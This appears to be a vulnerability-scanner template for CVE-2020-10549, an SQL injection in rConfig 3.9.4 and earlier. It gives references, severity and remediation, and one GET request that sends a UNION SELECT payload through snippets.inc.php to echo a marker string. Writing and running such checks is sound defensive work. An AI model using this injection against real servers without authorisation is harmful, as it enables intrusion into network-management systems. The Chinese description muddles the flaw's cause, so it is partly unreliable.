id: CVE-2020-10549
info:
  name: rConfig <=3.9.4 - SQL Injection
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - rconfig
  - sqli
  description: |-
    rConfig before 3.9.4 snippets.inc.php SQL注入漏洞
    rConfig是一款开源的网络配置管理实用程序。

    rConfig 3.9.4及之前版本中存在SQL注入漏洞，该漏洞源于程序以明文形式存储节点密码。攻击者可利用该漏洞访问被监听的网络设备。
  reference:
  - https://github.com/theguly/exploits/blob/master/cve-2020-10549.py
  - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/cve-2020-10549
  severity: critical
  classification:
    cve-id:
    - cve-2020-10549
    cwe-id:
    - cwe-89
    - cwe-522
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案:
    1.目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://www.rconfig.com/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - '[project-discovery]'
  matchers-condition: and
  path:
  - '{{BaseURL}}/snippets.inc.php?search=True&searchField=antani''+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains'
  method: GET
